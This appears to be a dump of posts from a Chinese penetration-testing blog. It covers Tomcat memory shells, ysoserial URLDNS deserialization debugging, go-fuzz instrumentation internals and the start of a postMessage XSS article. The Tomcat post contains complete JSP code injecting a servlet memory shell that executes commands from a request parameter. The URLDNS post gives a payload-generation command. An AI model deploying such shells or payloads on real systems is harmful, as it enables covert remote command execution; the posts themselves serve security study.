(org.apache.catalina.util)\naddChildInternal:726, ContainerBase (org.apache.catalina.core)\naddChild:698, ContainerBase (org.apache.catalina.core)\naddChild:696, StandardHost (org.apache.catalina.core)\nmanageApp:1783, HostConfig (org.apache.catalina.startup)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\n......\n里面的fireLifecycleEvent解析调用了web.xml内容\nprotected void fireLifecycleEvent(String type, Object data) {\n    LifecycleEvent event = new LifecycleEvent(this, type, data);\n    Iterator var4 = this.lifecycleListeners.iterator();\n\n    while(var4.hasNext()) {\n        LifecycleListener listener = (LifecycleListener)var4.next();\n        listener.lifecycleEvent(event);\n    }\n\n}\n从而webconfig调用此解析内容进行配置，将内容通过configureContext来创建StandWrapper\n    if (this.ok) {\n        this.configureContext(webXml);\n    }\n} else {\n    webXml.merge(tomcatWebXml);\n    webXml.merge(defaults);\n    this.convertJsps(webXml);\n    this.configureContext(webXml);\n}\n在后面通过：\nthis.context.addServletMappingDecoded(urlPattern, jspServletName, true);\n进行url路径的添加，因为加载顺序是Listener-&gt;Filter-&gt;Servlet，所以还要之间还要对Listener，Filter进行加载，到后由loadOnStartup加载之前的wrapper，其中有一个判断需要注意下：\nif (loadOnStartup &gt;= 0) {\n    Integer key = loadOnStartup;\n    ArrayList&lt;Wrapper&gt; list = (ArrayList)map.get(key);\n    if (list == null) {\n        list = new ArrayList();\n        map.put(key, list);\n    }\n\n    list.add(wrapper);\n}\n也就是说loadOnStartup大于等于0才会进行后续的操作（其实设置为0也不会进行），这个属性默认-1，表示启动的优先级，往后就成功加载了Servlet了。其中configureContext在创建Wrapper时规定了几个必要的属性：\nLoadOnStartup属性：\nwrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());\nServletName属性：\nwrapper.setName(servlet.getServletName());\nServletClass属性：\nwrapper.setServletClass(servlet.getServletClass());\n那我们加载的代码逻辑就在创建wrapper后，分别设置LoadOnStartup属性、ServletName属性以及ServletClass属性，最后通过addChild以及addServletMappingDecoded进行加载到对应路径，完整代码如下：\n&lt;%@ page import=\"java.lang.reflect.Field\" %&gt;\n&lt;%@ page import= \"javax.servlet.ServletException\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %&gt;\n&lt;%@ page import=\"java.io.IOException\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.Wrapper\" %&gt;\n&lt;%@ page import=\"java.io.InputStream\" %&gt;\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\n\n&lt;%\n     class ServletShell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String command = req.getParameter(\"servletshell\");\n            if (command != null) {\n                try {\n                    InputStream in = Runtime.getRuntime().exec(command).getInputStream();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } catch (NullPointerException n) {\n                    n.printStackTrace();\n                }\n            }\n        }\n\n\n         @Override\n         protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n             doGet(req, resp);\n         }\n\n    }\n\n    ServletShell shellservlet = new ServletShell();\n    String servletname = shellservlet.getClass().getSimpleName();\n\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext standardContext = (StandardContext) req.getContext();\n\n\n    Wrapper wrappershell = standardContext.createWrapper();\n\n    wrappershell.setServlet(shellservlet);\n\n    wrappershell.setLoadOnStartup(1);\n    wrappershell.setName(servletname);\n    wrappershell.setServletClass(shellservlet.getClass().getName());\n\n    standardContext.addChild(wrappershell);\n    standardContext.addServletMappingDecoded(\"/*\",servletname);\n%&gt;\n小结  这里只介绍了最基本的几种内存马，对于spring默认不解析jsp的有其他的利用方式，而且字节注入内存马和其他骚操作也有很广的利用场景，不少师傅也挖到了利用链，但在实战中写内存马一定要注意路径匹配问题，一旦把路由弄乱，影响测试方的正常业务，那就糟糕了。\n","slug":"Tomcat内存马解析","date":"2022-03-26T10:48:45.000Z","categories_index":"渗透测试","tags_index":"","author_index":"RainSec"},{"id":"609cb3bd3160d9a24e01a566229d052d","title":"URLDNS调试那些小事","content":"URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。\nysoserial链接：下载地址: https://github.com/frohoff/ysoserial\n这里用jdk1.8来编译\n\n编译ysoserial用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。\n下载好后进入GeneratePayload这个类\n进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。\n若运行成功后\n\n按下蓝色小闪电，然后package进行编译打包。\ntarget目录下会显示编译好的jar包。\n漏洞搭建建立maven项目：\nimport java.io.FileInputStream;\nimport java.io.ObjectInputStream;\n\npublic class bug {\n    public static void main(String[] args) throws Exception {\n        FileInputStream inputStream = new FileInputStream(\"poc.ser\");\n        ObjectInputStream oi = new ObjectInputStream(inputStream);\n        oi.readObject();\n        oi.close();\n        System.out.println(\"反序列化完成\");\n\n    }\n}\n\nps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。\n生成恶意poc：\n在http://dnslog.cn/\n获得临时域名：0dt3fc.dnslog.cn\n java -jar .\\ysoserial-0.0.5-all.jar URLDNS “http://0dt3fc.dnslog.cn\" &gt; poc.ser\n将poc.ser放在漏洞项目根目录运行即可。\n\n注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：https://gitter.im/frohoff/ysoserial/archives/2017/09/18\n调试大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。\n在URLDNS.java下，作者写了如下利用链：\n*   Gadget Chain:\n*     HashMap.readObject()\n*       HashMap.putVal()\n*         HashMap.hash()\n*           URL.hashCode()\n*\n\n在刚开始会new  HashMap()，\n\n接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key\n\n值得关注key.hashCode()方法，\n\n当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）\n这里调用getHostAddress\n\n他会进行dns的查询。\n然后就是一些细节：\n在Hashmap的readObject\n\nkey是从readObject得到的，说明key应该在writeObject被写入了。\nWriteObject最后会调用到internalWriteEntries(s)。\n\n从中可看出，key和value都来自table，即HashMap中table的值。\n要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。\n\n这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，\n可以直接返回NULL，不会有后续的操作，从而不会dns请求。\n知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。\n参考：\nhttps://www.yuque.com/pmiaowu/gpy1q8/ygthda\nhttps://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc\nhttps://xz.aliyun.com/t/7157?page=5\n","slug":"URLDNS调试那些小事","date":"2022-03-26T10:48:45.000Z","categories_index":"渗透测试","tags_index":"","author_index":"RainSec"},{"id":"5c3101d9d1523d1869d7d8a2235ebd0e","title":"云原生项目Fuzz特点及思考","content":"Go-fuzz的解析与思考go-fuzz\n\n\n\n\n\n\n\n\nGo-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。\n​        go-fuzz是google开源的一款go语言fuzz框架，它和AFL很大的一个不同是在于，AFL通常通过对未修改的文件的输入进行操作，而go-fuzz需要你编写一个Fuzz函数，go-fuzz通过不断的调用该函数来进行fuzz，前者通常会为每一个输入创建一个新的进程，后者则是不断的调用Fuzz函数因此不需要经常启动或者重启进程。\n什么是覆盖引导型Fuzz​        覆盖引导型Fuzz通过代码覆盖率信息来决定一个突变是否有效，如果代码覆盖率增长就保存该输入并对其进行持续变异，否则就丢弃该变异：\n\n\n\n\n源码解析go-fuzz-build模块​        该模块的主要作用在于将需要测试的包信息和测试用例信息打包方便进行测试。\n\n利用PProf进行性能分析\n加载选中的go语言包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个fuzz材料包\n遍历加载的go语言包里面所有的函数名查找所有的名为Fuzz的函数，同时进行签名认证，但是Fuzz函数的个数应该大于0同时小于等于255\n获取环境变量，大多是和go有关的环境变量.\n加载go语言标准库\n忽略一些标准库中的包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个包，因为没有理由进行fuzz测试，为了避免陷入循环（具体为啥我也不是很清楚）\n在/tmp下创建临时文件夹保存需要使用的tools和包\n接下来就是很高阶的语法树等的建立过程，这个过程中会使用gatherLiterals获取到你提供的初始材料\n获取到需要fuzz的包的具体信息，进而可以生成go-fuzz的元数据\n将存储信息的cover.exe和sonar.exe已经metadata打包生成zip文件夹\n\n\n\n语法树插桩实现​        go语言不同于C语言可以as等汇编工具来较为方便的实现编译时插桩（具体可以参考AFL的插桩方式），为了实现go语言的编译时插桩，我们首先要了解go语言整体的编译流程：\n\n词法与语法分析\n类型检查\n中间代码生成\n机器码生成\n\n那么其实大致就可以看出比较理想的地方就是词法与语法分析的时候对抽象语法书进行插桩了，同时go标准库也提供了scanner，ast和token等相关库来帮助很好的扫描，解析和创建相关抽象语法树，在整个插桩的过程中其实是把go的包一个个遍历插桩的，然后因为go-fuzz不允许导入main包，其实是因为它在插桩完成之后会自己加入相关的main函数。\n​        在go-fuzz-build中实现了结构体File和结构体Sonar，这两个结构体都实现了自己的Visit()函数用来遍历相关的语法树：\ntype File struct {\n\tfset     *token.FileSet\n\tpkg      string\n\tfullName string\n\tastFile  *ast.File\n\tblocks   *[]CoverBlock\n\tinfo     *types.Info\n}\n\ntype Sonar struct {\n\tfset     *token.FileSet\n\tfullName string\n\tpkg      string\n\tblocks   *[]CoverBlock\n\tinfo     *types.Info\n}\n\n在整个的build的过程中也会生成coverBin和sonarBin两个文件分别对应上述两个结构体的语法树遍历函数执行结果。\nFile遍历​        在生成coverBin的时候使用的是File结构体对应的Visit遍历函数，不过在开始遍历之前会通过自身实现的addImport来实现go-fuzz-dep包相关内容的导入：\n\n\n\n\n\n\n\n\n\nfile.addImport(“go-fuzz-dep”, fuzzdepPkg, “CoverTab”)\nfunc (f *File) addImport(path, name, anyIdent string) {\n\tnewImport := &amp;ast.ImportSpec{\n\t\tName: ast.NewIdent(name),\n\t\tPath: &amp;ast.BasicLit{\n\t\t\tKind:  token.STRING,\n\t\t\tValue: fmt.Sprintf(\"%q\", path),\n\t\t},\n\t}\n\timpDecl := &amp;ast.GenDecl{\n\t\tLparen: f.astFile.Name.End(),\n\t\tTok:    token.IMPORT,\n\t\tSpecs: []ast.Spec{\n\t\t\tnewImport,\n\t\t},\n\t\tRparen: f.astFile.Name.End(),\n\t}\n\t// Make the new import the first Decl in the file.\n\tastFile := f.astFile\n\tastFile.Decls = append(astFile.Decls, nil)\n\tcopy(astFile.Decls[1:], astFile.Decls[0:])\n\tastFile.Decls[0] = impDecl\n\tastFile.Imports = append(astFile.Imports, newImport)\n\n\t// Now refer to the package, just in case it ends up unused.\n\t// That is, append to the end of the file the declaration\n\t//\tvar _ = _cover_atomic_.AddUint32\n\treference := &amp;ast.GenDecl{\n\t\tTok: token.VAR,\n\t\tSpecs: []ast.Spec{\n\t\t\t&amp;ast.ValueSpec{\n\t\t\t\tNames: []*ast.Ident{\n\t\t\t\t\tast.NewIdent(\"_\"),\n\t\t\t\t},\n\t\t\t\tValues: []ast.Expr{\n\t\t\t\t\t&amp;ast.SelectorExpr{\n\t\t\t\t\t\tX:   ast.NewIdent(name),\n\t\t\t\t\t\tSel: ast.NewIdent(anyIdent),\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\tastFile.Decls = append(astFile.Decls, reference)\n}\n\n观察源码其实逻辑也很简单，首先创建了一个基本声明信息节点来将相关的包导入原本的语法树中，同时为了避免导入包但是未使用，所以导入简单的声明语句。导入完成之后使用ast.Walk()来遍历语法树，该函数会调用File结构体对应的Visit函数。\n// 源码太长，只贴部分\nfunc (f *File) Visit(node ast.Node) ast.Visitor {\n\tswitch n := node.(type) {\n\tcase *ast.FuncDecl:\n\t\tif n.Name.String() == \"init\" {\n\t\t\t// Don't instrument init functions.\n\t\t\t// They run regardless of what we do, so it is just noise.\n\t\t\treturn nil\n\t\t}\n\tcase *ast.GenDecl:\n\t\tif n.Tok != token.VAR {\n\t\t\treturn nil // constants and types are not interesting\n\t\t}\n\n\tcase *ast.BlockStmt: // {}中间的语句\n\t\t// If it's a switch or select, the body is a list of case clauses; don't tag the block itself.\n\t\tif len(n.List) &gt; 0 {\n\t\t\tswitch n.List[0].(type) {\n\t\t\tcase *ast.CaseClause: // switch\n\t\t\t\tfor _, n := range n.List {\n\t\t\t\t\tclause := n.(*ast.CaseClause)\n\t\t\t\t\tclause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)\n\t\t\t\t}\n\t\t\t\treturn f\n\t\t\tcase *ast.CommClause: // select\n\t\t\t\tfor _, n := range n.List {\n\t\t\t\t\tclause := n.(*ast.CommClause)\n\t\t\t\t\tclause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)\n\t\t\t\t}\n\t\t\t\treturn f\n\t\t\t}\n\t\t}\n\t\tn.List = f.addCounters(n.Lbrace, n.Rbrace+1, n.List, true) // +1 to step past closing brace.\n......\n}\n\n可以看出在遍历语法树的过程中对节点的类型进行了判断，然后对{}中间的内容进行一个判断和插桩，具体的插桩函数如下：\nfunc (f *File) addCounters(pos, blockEnd token.Pos, list []ast.Stmt, extendToClosingBrace bool) []ast.Stmt {\n\t// Special case: make sure we add a counter to an empty block. Can't do this below\n\t// or we will add a counter to an empty statement list after, say, a return statement.\n\tif len(list) == 0 {\n\t\treturn []ast.Stmt{f.newCounter(pos, blockEnd, 0)}\n\t}\n\t// We have a block (statement list), but it may have several basic blocks due to the\n\t// appearance of statements that affect the flow of control.\n\tvar newList []ast.Stmt\n\tfor {\n\t\t// Find first statement that affects flow of control (break, continue, if, etc.).\n\t\t// It will be the last statement of this basic block.\n\t\tvar last int\n\t\tend := blockEnd\n\t\tfor last = 0; last &lt; len(list); last++ {\n\t\t\tend = f.statementBoundary(list[last])\n\t\t\tif f.endsBasicSourceBlock(list[last]) {\n\t\t\t\textendToClosingBrace = false // Block is broken up now.\n\t\t\t\tlast++\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif extendToClosingBrace {\n\t\t\tend = blockEnd\n\t\t}\n\t\tif pos != end { // Can have no source to cover if e.g. blocks abut.\n\t\t\tnewList = append(newList, f.newCounter(pos, end, last)) // 在List里面增加counter计数器\n\t\t}\n\t\tnewList = append(newList, list[0:last]...)\n\t\tlist = list[last:]\n\t\tif len(list) == 0 {\n\t\t\tbreak\n\t\t}\n\t\tpos = list[0].Pos()\n\t}\n\treturn newList\n}\n\n假设现在有一个switch的demo\nfunc main() {\n\tvar n = 1\n\tswitch n {\n\tcase 0:\n\t\tfmt.Println(\"this is 0\")\n\tcase 1:\n\t\tfmt.Println(\"this is 1\")\n\t}\n}\n\n这一步的具体操作就是把每一个case拿出来，然后将case相关的语法树的起始位置和结束位置还有body部分全部传入addCounters，addCounters的逻辑起始也非常简单，如果body为空就直接返回一个Counter的ast.Stmt声明语法树结构，\n\n\n\n\n\n\n\n\n\n Counter是作者自定义的一种插桩计数器，这种计数器主要包括两个部分:\n\n对于每个包的File的结构体都维护了一个*[]CoverBlock，每次增加Counter都会在这个数组里面增加一个CoverBlock里面记录了插桩语法树的位置以及内部是否还包含多少其他声明。\n一个是ast.IncDecStmt节点，这个是newCounter()函数的返回值\n\n如果body不为空就找到所有影响控制流的声明，比如if，switch, break ,goto等都会开启或者中断一个新的控制流，找到边界声明之后判断其是否属于刚才的类型：\nfunc (f *File) endsBasicSourceBlock(s ast.Stmt) bool {\n\tswitch s := s.(type) {\n\tcase *ast.BlockStmt:\n\t\t// Treat blocks like basic blocks to avoid overlapping counters.\n\t\treturn true\n\tcase *ast.BranchStmt:\n\t\treturn true\n\tcase *ast.ForStmt:\n\t\treturn true\n\tcase *ast.IfStmt:\n\t\treturn true\n\tcase *ast.LabeledStmt:\n\t\treturn f.endsBasicSourceBlock(s.Stmt)\n\tcase *ast.RangeStmt:\n\t\treturn true\n\tcase *ast.SwitchStmt:\n\t\treturn true\n\tcase *ast.SelectStmt:\n\t\treturn true\n\tcase *ast.TypeSwitchStmt:\n\t\treturn true\n\tcase *ast.ExprStmt:\n\t\t// Calls to panic change the flow.\n\t\t// We really should verify that \"panic\" is the predefined function,\n\t\t// but without type checking we can't and the likelihood of it being\n\t\t// an actual problem is vanishingly small.\n\t\tif call, ok := s.X.(*ast.CallExpr); ok {\n\t\t\tif ident, ok := call.Fun.(*ast.Ident); ok &amp;&amp; ident.Name == \"panic\" &amp;&amp; len(call.Args) == 1 {\n\t\t\t\treturn true\n\t\t\t}\n\t\t}\n\t}\n\tfound, _ := hasFuncLiteral(s)\n\treturn found\n}\n\n其实就是大量的switch语句，如果是的话，就可以将直接边界作为end进行插桩，这一步的意义其实就是在于把{}里面的body不断的分割成一个个可以影响控制流的小块进行分别插桩。其实到这里我们就可以洞悉go-fuzz整个的插桩思想：在语法分析的时候就通过go-fuzz本身所包含的一个包的内容插桩到各个可以影响控制流的语句块中，那么接下来对应的工作就应该是如何对这些进行插桩语句块进行感知，这其实就是Sonar结构体的作用，这是go-fuzz发明的声呐系统。\nSonar遍历​        Sonar结构体同样实现了Visit方法来用于遍历语法树，部分源码如下：\nfunc (s *Sonar) Visit(n ast.Node) ast.Visitor {\nswitch nn := n.(type) {\n\tcase *ast.BinaryExpr:\n\t\tbreak\n......\ncase *ast.SwitchStmt:\n\t\tif nn.Tag == nil || nn.Body == nil {\n\t\t\treturn s // recurse\n\t\t}\n\t\t// Replace:\n\t\t//\tswitch a := foo(); bar(a) {\n\t\t//\tcase x: ...\n\t\t//\tcase y: ...\n\t\t//\t}\n\t\t// with:\n\t\t//\tswitch {\n\t\t//\tdefault:\n\t\t//\t\ta := foo()\n\t\t//\t\t__tmp := bar(a)\n\t\t//\t\tswitch {\n\t\t//\t\tcase __tmp == x: ...\n\t\t//\t\tcase __tmp == y: ...\n\t\t//\t\t}\n\t\t//\t}\n\t\t// The == comparisons will be instrumented later when we recurse.\n\t\tsw := new(ast.SwitchStmt)\n\t\t*sw = *nn\n\t\tvar stmts []ast.Stmt\n\t\tif sw.Init != nil {\n\t\t\tstmts = append(stmts, sw.Init)\n\t\t\tsw.Init = nil\n\t\t}\n\t\tconst tmpvar = \"__go_fuzz_tmp\"\n\t\ttmp := ast.NewIdent(tmpvar)\n\t\ttyp := s.info.Types[sw.Tag]\n\t\ts.info.Types[tmp] = typ\n\t\tstmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{tmp}, Tok: token.DEFINE, Rhs: []ast.Expr{sw.Tag}})\n\t\tstmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{ast.NewIdent(\"_\")}, Tok: token.ASSIGN, Rhs: []ast.Expr{tmp}})\n\t\tsw.Tag = nil\n\t\tstmts = append(stmts, sw)\n\t\tfor _, cas1 := range sw.Body.List {\n\t\t\tcas := cas1.(*ast.CaseClause)\n\t\t\tfor i, expr := range cas.List {\n\t\t\t\ttmp := &amp;ast.Ident{Name: tmpvar, NamePos: expr.Pos()}\n\t\t\t\ts.info.Types[tmp] = typ\n\t\t\t\tcas.List[i] = &amp;ast.BinaryExpr{X: tmp, Op: token.EQL, Y: expr}\n\t\t\t}\n\t\t}\n\t\tnn.Tag = nil\n\t\tnn.Init = nil\n\t\tnn.Body = &amp;ast.BlockStmt{List: []ast.Stmt{&amp;ast.CaseClause{Body: stmts}}}\n\t\treturn s // recurse\n......\n}\n\n第一步先根据节点类型找到Switch和For这种结构进行语法树级别的变化，整体的替换逻辑已经在注释里面体现出来了，其实就是类似把switch的条件都提出来放在body内部，然后再body里面建立一个新的switch结构，主要作用可能就是方便识别和统计，对于ast.BinaryExpr结构则是通过自定义的flag进行标注。\n​        整体来看其实就是对包内代码各种语法树节点进行类型检查和过滤，因为一些代码是肯定顺序执行的，然后再需要的地方都插入一些标志，同时在结构体里面记录标志的总量，方便在fuzz执行的时候确定自己的代码位置从而更方便进行统计，具体的可以细看相关代码。\n插桩总结​        其实无论是File还是Sonar，个人认为都算是一种插桩，方便对代码覆盖率进行统计，在结束之后都通过createFuzzMain函数进行了封装，这个地方其实也是go-fuzz不支持fuzz的代码包含main函数的具体原因：\nfunc (c *Context) createFuzzMain() string {\n\tmainPkg := filepath.Join(c.fuzzpkg.PkgPath, \"go.fuzz.main\")\n\tpath := filepath.Join(c.workdir, \"gopath\", \"src\", mainPkg)\n\tc.mkdirAll(path)\n\tc.writeFile(filepath.Join(path, \"main.go\"), c.funcMain())\n\treturn mainPkg\n}\n\n其实就是将已经写好的main函数模板写入：\nvar ainSrc = template.Must(template.New(\"main\").Parse(`\npackage main\n\nimport (\n\ttarget \"{{.Pkg}}\"\n\tdep \"go-fuzz-dep\"\n)\n\nfunc main() {\n\tfns := []func([]byte)int {\n\t\t{{range .AllFuncs}}\n\t\t\ttarget.{{.}},\n\t\t{{end}}\n\t}\n\tdep.Main(fns)\n}\n`))\n\n主要作用还是调用包内的Fuzz代码。\ngo-fuzz\n首先通过丢弃触发相同代码路径的的样本来最小化语料库。\n开始改变输入并将数据传递给Fuzz函数，不失败（return 1），然后扩展代码覆盖率的突变会被保留和迭代形成新的样本。\n当程序出现Crash的时候，会保存报告并重新启动程序。\n\nFuzz这块的具体原理其实都是参考的AFL，就不多说了，详细也可以参考AFL的Fuzz方式和源码。\n测试用例​        首先简单介绍一下go的Fuzz函数的基本信息：\nfunc Fuzz(data []byte) int {\n\n}\n\n该函数以int作为返回值，因此当其返回值为0的时候说明Fuzz对于数据不敢影响，可能的原因是测试目标发生了无意义的错误，比如输入内容不合法等，返回值为1说明该数据已经被成功解析，简单来说就是Fuzz输入的data被目标所接受。\nDNS解析器Fuzz首先第一步是创建初始语料库，其实就是通过拆解pcap数据包来创造数据：\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"encoding/hex\"\n\t\"log\"\n\t\"os\"\n\t\"strconv\"\n\n\t\"github.com/miekg/pcap\"\n)\n\nfunc fatalIfErr(err error) {\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc main() {\n\thandle, err := pcap.OpenOffline(os.Args[1])\n\tfatalIfErr(err)\n\n\tb := make([]byte, 4)\n\t_, err = rand.Read(b)\n\tfatalIfErr(err)\n\tprefix := hex.EncodeToString(b)\n\n\ti := 0\n\tfor pkt := handle.Next(); pkt != nil; pkt = handle.Next() {\n\t\tpkt.Decode()\n\n\t\tf, err := os.Create(\"p_\" + prefix + \"_\" + strconv.Itoa(i))\n\t\tfatalIfErr(err)\n\t\t_, err = f.Write(pkt.Payload)\n\t\tfatalIfErr(err)\n\t\tfatalIfErr(f.Close())\n\n\t\ti++\n\t}\n}\n\n编写初步的Fuzz函数：\nfunc Fuzz(rawMsg []byte) int {\n    msg := &amp;dns.Msg{}\n\n    if unpackErr := msg.Unpack(rawMsg); unpackErr != nil {\n        return 0\n    }\n\n    if _, packErr = msg.Pack(); packErr != nil {\n        println(\"failed to pack back a message\")\n        spew.Dump(msg)\n        panic(packErr)\n    }\n\n    return 1\n}\n\n作者在发现了越界：\nfunc unpackTxt(msg []byte, offset, rdend int) ([]string, int, error) {\n\tvar err error\n\tvar ss []string\n\tvar s string\n\tfor offset &lt; rdend &amp;&amp; err == nil {\n\t\ts, offset, err = unpackTxtString(msg, offset)\n\t\tif err == nil {\n\t\t\tss = append(ss, s)\n\t\t}\n\t}\n\treturn ss, offset, err\n}\n\n但是因为这些越界使得程序经常崩溃，并且Fuzz变的缓慢，于是作者先进行了阶段性的修复工作，主要修复是使用len(msg)而不是使用保留的偏移量：\nfunc unpackTxt(msg []byte, off0 int) (ss []string, off int, err error) {\n\toff = off0\n\tvar s string\n\tfor off &lt; len(msg) &amp;&amp; err == nil {\n\t\ts, off, err = unpackTxtString(msg, off)\n\t\tif err == nil {\n\t\t\tss = append(ss, s)\n\t\t}\n\t}\n\treturn\n}\n\n之后修改好的Fuzz，主要的修改在于增加了ParseDNSPacketSafely，并抛弃了一些无意义的错误，也可能不断测试，不断排除已知的错误:\nfunc Fuzz(rawMsg []byte) int {\n    var (\n        msg, msgOld = &amp;dns.Msg{}, &amp;old.Msg{}\n        buf, bufOld = make([]byte, 100000), make([]byte, 100000)\n        res, resOld []byte\n\n        unpackErr, unpackErrOld error\n        packErr, packErrOld     error\n    )\n\n    unpackErr = msg.Unpack(rawMsg)\n    unpackErrOld = ParseDNSPacketSafely(rawMsg, msgOld)\n\n    if unpackErr != nil &amp;&amp; unpackErrOld != nil {\n        return 0\n    }\n\n    if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: out of order NSEC block\" {\n        // 97b0a31 - rewrite NSEC bitmap [un]packing to account for out-of-order\n        return 0\n    }\n\n    if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad rdlength\" {\n        // 3157620 - unpackStructValue: drop rdlen, reslice msg instead\n        return 0\n    }\n\n    if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad address family\" {\n        // f37c7ea - Reject a bad EDNS0_SUBNET family on unpack (not only on pack)\n        return 0\n    }\n\n    if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad netmask\" {\n        // 6d5de0a - EDNS0_SUBNET: refactor netmask handling\n        return 0\n    }\n\n    if unpackErr != nil &amp;&amp; unpackErrOld == nil {\n        println(\"new code fails to unpack valid packets\")\n        panic(unpackErr)\n    }\n\n    res, packErr = msg.PackBuffer(buf)\n\n    if packErr != nil {\n        println(\"failed to pack back a message\")\n        spew.Dump(msg)\n        panic(packErr)\n    }\n\n    if unpackErrOld == nil {\n\n        resOld, packErrOld = msgOld.PackBuffer(bufOld)\n\n        if packErrOld == nil &amp;&amp; !bytes.Equal(res, resOld) {\n            println(\"new code changed behavior of valid packets:\")\n            println()\n            println(hex.Dump(res))\n            println(hex.Dump(resOld))\n            os.Exit(1)\n        }\n\n    }\n\n    return 1\n}\n\nTips：\n​        其实在Fuzz过程中也会遇到一些结构化的问题，毕竟大型项目都会存在大量的复杂结构体难以变异，这时候才为大家提供一个神器go-fuzz-header：\n\n\n\n\n\n\n\n\n\nhttps://adalogics.com/blog/structure-aware-go-fuzzing-complex-types\n云原生下的Fuzz思考​        云原生的很多新技术其实都是在老技术的交叉上形成的，其实可以类似go项目结构里面的不同的包，对于很多Fuzz目标来言，像以前那样直接从最根本处下手已经不太现实可行，比如容器Fuzz其实很难通过生成大量镜像或者docker client的命令来解决，恰恰相反深入程序内部针对不同函数来编写Fuzz或许更有价值。\n​        但是缺点也很明显，首先必须和代码审计相结合，其次就是由于代码是否用户可达或者crash是否真的引发漏洞效果都有待评估，正如go-fuzz创始人所说：“go-fuzz其实更适合开发者来寻求自己项目中存在的bug”，但是漏洞挖掘技术也是在不断的进步之中，或许可以思考如何把找到的bug发展成漏洞，毕竟对于内存安全的高级语言来说直接谋求可利用漏洞相对困难。\n​        其实在内存漏洞越来越少的现在，这种bug最终演变成漏洞的例子还是有的，就比如linux pkexec提权漏洞，过去几年大家都认为这是一个bug，但是等利用方式被真正发掘，就能变化成为严重的安全问题。\n参考资料\n\n\n\n\n\n\n\n\nhttps://github.com/dvyukov/go-fuzz\n","slug":"Go-Fuzz解析与思考","date":"2022-03-25T10:48:45.000Z","categories_index":"漏洞挖掘","tags_index":"Fuzz","author_index":"RainSec"},{"id":"68bdee9933fc5dc89a593d8b4b4eaea6","title":"EventListener XSS","content":"EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所导致漏洞。首先从事件监听器开始说起\n事件监听器事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：\n&lt;table id=\"outside\"&gt;\n    &lt;tr&gt;&lt;td id=\"t1\"&gt;one&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td id=\"t2\"&gt;two&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;\n&lt;script&gt;\nfunction modifyText() {\n  var t2 = document.getElementById(\"t2\");\n  if (t2.firstChild.nodeValue == \"three\") {\n    t2.firstChild.nodeValue = \"two\";\n  } else {\n    t2.firstChild.nodeValue = \"three\";\n  }\n}\n\n// 为table添加事件监听器\nvar el = document.getElementById(\"outside\");\nel.addEventListener(\"click\", modifyText, false);\n&lt;/script&gt;\n\n以上代码监听了table的click事件，当点击table时会触发modifyText,下面链接列出了所有的事件:\nhttps://developer.mozilla.org/en-US/docs/Web/Events#event_index\n这里要说的是postMessage与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下postMessage的介绍：\n&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 